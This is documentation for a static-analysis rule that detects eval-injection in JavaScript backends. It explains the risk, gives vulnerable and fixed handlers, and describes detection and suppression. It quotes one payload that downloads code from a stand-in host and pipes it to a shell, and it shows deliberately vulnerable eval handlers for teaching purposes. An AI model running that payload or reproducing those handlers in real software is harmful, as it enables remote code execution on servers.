# `flow/eval-injection`

> Catches untrusted request input flowing into a JavaScript
> dynamic-code call — `eval`, the `Function` constructor (call or
> `new` form), or `setTimeout` / `setInterval` with a string
> first argument. Each of these parses its argument as code and
> executes it under the application's process identity.

## Metadata

| Field | Value |
|---|---|
| Rule ID | `flow/eval-injection` |
| Status | experimental |
| Severity | critical |
| Frameworks | generic JS/TS backend (Express, Hono, Next.js route handlers, NestJS controllers) |
| Default | enabled |
| Added in | v0.5 (first cut — single-file slice) |

## What this rule catches

`eval` is the textbook remote code execution primitive: hand it a
string and the runtime parses that string as JavaScript and runs
it under the calling process's identity. When the string comes
from a request body, query, or path parameter, an attacker can
read your environment variables, exfiltrate database credentials,
issue outbound requests, or pivot to the rest of your
infrastructure.

Stryx flags request-body data flowing into the four JavaScript
APIs that have eval semantics:

- **`eval(<code>)`** — the canonical dynamic-code call.
- **`Function(<code>)` and `new Function(<code>)`** — the
  Function constructor; the last argument is parsed as a function
  body and returned as a callable. The caller almost always
  invokes the result on the next line, so we treat the
  construction site itself as the sink.
- **`setTimeout(<code>, <delay>)` and `setInterval(<code>,
  <delay>)`** — when the first argument is a string (not a
  function literal), the runtime evaluates it with eval
  semantics. This is the "implied eval" shape; ESLint calls it
  `no-implied-eval`. The benign `setTimeout(() => ..., 1000)`
  shape — first argument is a function — is not flagged.

The real-world reference for this rule is the OWASP
[NodeGoat](https://github.com/OWASP/NodeGoat)
project's `app/routes/contributions.js` handler, which passes
`req.body.preTax` and `req.body.afterTax` straight into `eval`
so the front-end can submit numeric expressions like `"100 +
50"`. An attacker can submit `process.mainModule.require('child_process').execSync('curl evil.example | sh')`
and the server runs it.

## Why this happens

`eval` shows up in real codebases for one reason: it is the
shortest way to turn a string into a value. Developers reach for
it when they want to:

- Accept "math expressions" from the client (`"100 + 50"`,
  `"x * 2"`) without writing a parser.
- Deserialise something that looks like JSON but might also
  contain JavaScript literals (`undefined`, function expressions)
  that `JSON.parse` rejects.
- Bind a small piece of behaviour at runtime from a string
  loaded out of a database or config file.

The Function constructor and `setTimeout(<string>, ...)` are the
"I know `eval` is bad so I'll use something that looks
different" variants. They have identical security semantics: any
attacker-controllable string passed to them is RCE.

## Bad example

```ts
// Repro: untrusted request input passed straight to eval / new
// Function / setTimeout-with-string.

import type { Request, Response } from "express";

export function updateContributions(req: Request, res: Response) {
  const preTax = eval(req.body.preTax);
  const afterTax = eval(req.body.afterTax);
  res.json({ preTax, afterTax });
}

export function runUserExpression(req: Request, res: Response) {
  const fn = new Function("return " + req.body.expr);
  res.json({ result: fn() });
}

export function scheduleUserCode(req: Request, res: Response) {
  const code = req.body.code;
  setTimeout(code, 1000);
  res.json({ scheduled: true });
}
```

Each handler is RCE. `preTax` can be any JavaScript expression;
the Function-constructor concatenation is an injection seam even
without the `return` prefix; the `setTimeout(code, 1000)` form
schedules attacker code to run on the event loop.

## Good example

```ts
import type { Request, Response } from "express";
import { z } from "zod";

// Numeric input — parse with `Number` / `parseInt` and reject
// on NaN. No eval involved.
export function updateContributions(req: Request, res: Response) {
  const preTax = Number(req.body.preTax);
  const afterTax = parseInt(req.body.afterTax, 10);
  if (!Number.isFinite(preTax) || !Number.isFinite(afterTax)) {
    return res.status(400).json({ error: "bad number" });
  }
  return res.json({ preTax, afterTax });
}

// Structured "expressions" — describe the shape with zod and
// interpret it with normal code. The runtime never parses a
// caller-supplied string as JavaScript.
const ExprBody = z.object({
  op: z.enum(["add", "sub"]),
  a: z.number(),
  b: z.number(),
});

export function runUserExpression(req: Request, res: Response) {
  const parsed = ExprBody.safeParse(req.body);
  if (!parsed.success) {
    return res.status(400).json({ error: "bad body" });
  }
  const { op, a, b } = parsed.data;
  return res.json({ result: op === "add" ? a + b : a - b });
}

// `setTimeout` with a function literal — the first argument is
// an arrow expression, not a string. Stryx does not flag this
// shape even when the closed-over data is request-tainted.
export function scheduleUserCode(req: Request, res: Response) {
  const delay = Number(req.body.delay) || 1000;
  setTimeout(() => {
    console.log("ran after", delay, "ms");
  }, delay);
  res.json({ scheduled: true });
}
```

## How to fix

Remove the dynamic-code call. There is no safe variant when the
argument is request-controlled.

- For numeric input, use `Number(value)` or `parseInt(value,
  10)` and check `Number.isFinite` before using the result.
- For structured input, define a `zod` (or `valibot`, `yup`)
  schema and `safeParse` the body. The schema is the contract,
  not the eval.
- For "expression" features (calculator, formula field), write a
  proper parser or use a library that interprets a constrained
  grammar (e.g. `mathjs`'s `evaluate` with a scope, not the
  global one). Do not delegate the interpretation to the JS
  runtime.
- For `setTimeout` / `setInterval`, always pass a function
  literal: `setTimeout(() => doWork(value), 1000)`. Never the
  string form.

## What Stryx recognizes

Recognized as safe:

- `Number(req.body.x)` / `parseInt(req.body.x, 10)` — these are
  not eval sinks; the body data does not reach a dynamic-code
  call.
- `setTimeout(() => doWork(...), 1000)` — first argument is an
  arrow or function expression; the sink recogniser short-circuits
  before inspecting any closed-over data.
- `JSON.parse(req.body.x)` — this rule does not flag it.
  (`JSON.parse` is a different category — it does not interpret
  JavaScript code; it parses a JSON document. A future rule may
  flag prototype-pollution or deep-nesting risks on it.)
- Calls where the eval-style name has been shadowed by a local
  binding (e.g. `const eval = (s) => safeParse(s);`). Slice 1's
  recogniser is bare-name and does not follow rebinds.

Not recognized as safe:

- `eval(\`return \${value}\`)` with body data interpolated into
  the template literal.
- `Function("return " + body)` — the `+` concatenation propagates
  taint through the template / binary expression.
- `setTimeout(stringContainingBody, delay)` — taint flows through
  a local variable into the string-payload position.
- TypeScript casts on the way in (`eval(value as string)`) — the
  rule sees through `as` / `satisfies` / `!` non-null /
  parenthesised expressions.

## Taint signature

| Field | Value |
|---|---|
| Source labels | `UserInput` (body / query / params / headers / `searchParams`) |
| Sink ids | `eval`, `Function`, `new Function`, `setTimeout(<string>, ...)`, `setInterval(<string>, ...)`. Bare-identifier callee shapes only. |
| Sanitizers recognized | None for slice 1. The canonical safe path is to remove the dynamic-code call entirely; there is no in-line escape that makes attacker-controlled JavaScript safe. |
| Scope | `SingleFile` |

## Detection logic

1. Walk every call expression and `new` expression.
2. For a call: the sink recogniser activates on a bare-identifier
   callee whose name is `eval`, `Function`, `setTimeout`, or
   `setInterval`. For the two timer names, the first argument is
   inspected — if it is an inline `function` expression or arrow
   function the call is benign and the sink does not match.
3. For a `new` expression: the sink recogniser activates on the
   `new Function(...)` shape (bare-identifier callee `Function`).
4. The first argument is the code payload. The rule runs the
   standard body-taint walk on it.
5. If the argument is body-tainted, emit a Critical Finding at
   the call (or `new`) span.

Cross-file detection is not part of this slice — if the body
data is funneled through a helper that owns the `eval` call, the
finding fires at the helper's eval site (single-file from the
helper's perspective), not at the route handler's call site.
That extension is a slice-2 candidate (mirrors the
`flow/command-injection-via-exec` shape).

## Known false positive zones

- **Lexer / parser self-tests** that pass curated literal
  strings into `eval` to exercise edge cases. These have no
  request input — the body-taint walk produces no finding when
  the argument is a constant.
  → No suppression needed; the rule is silent on constant inputs.
- **Sandboxed evaluators that take user code on purpose**
  (in-browser playgrounds, REPL servers). The whole product is
  the dangerous behaviour. Suppress at the call site with a
  reason that names the sandbox boundary:
  → `// stryx-disable-next-line flow/eval-injection -- vm2-sandboxed REPL`.
- **A custom utility function named `eval` / `Function`** in
  user code that happens to match the bare-identifier shape and
  consumes body-tainted data. Slice 1's recogniser is name-shape
  only; the rule fires on this and the user must suppress it.
  → `// stryx-disable-next-line flow/eval-injection -- not the global eval`.
- **`setTimeout(value, delay)` where `value` is a function-typed
  local** but the type isn't statically visible (e.g. came back
  from a typed `useCallback` result). Slice 1 only suppresses
  inline function/arrow literals; a tainted identifier in slot 0
  still fires. In practice this is rare in handler code.

## LLM escalation prompt (Layer 3)

Not applicable — this rule is fully deterministic at the AST
layer. There is no uncertain zone: either the callee name
matches one of the four eval-style APIs and the first argument
is body-tainted, or it is not.

## Performance characteristics

- AST analysis: ~0.3ms per file (single-file slice 1; same shape
  as `flow/path-traversal` and `flow/command-injection-via-exec`).
- No cross-file extract pass; no LLM escalation.

## Configuration

```toml
[rules."flow/eval-injection"]
severity = "critical"
```

## Suppressing this rule

Inline:
```ts
// stryx-disable-next-line flow/eval-injection -- reason
```

File-level:
```ts
// stryx-disable flow/eval-injection
```

Project-level (`stryx.toml`):
```toml
[rules]
disabled = ["flow/eval-injection"]
```

## See also

- OWASP A03:2021 — Injection
- CWE-95 — Improper Neutralization of Directives in Dynamically
  Evaluated Code ("Eval Injection")
- CWE-94 — Improper Control of Generation of Code
- MDN — [never use eval()!](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval#never_use_eval!)
- Real-world repro: OWASP NodeGoat,
  `app/routes/contributions.js` (`handleContributionsUpdate` —
  the canonical reference for body-data-to-eval).
- Related rules: `flow/command-injection-via-exec` (shell-level
  RCE), `flow/sql-injection` (database-level injection).

## History

| Version | Change |
|---|---|
| v0.5 | Initial single-file slice — body source → `eval` / `Function` / `new Function` / `setTimeout(<string>, ...)` / `setInterval(<string>, ...)` sinks. Bare-identifier callee shapes only. Severity Critical. No sanitiser recognition; inline function/arrow literals suppress the timer-call shapes. |
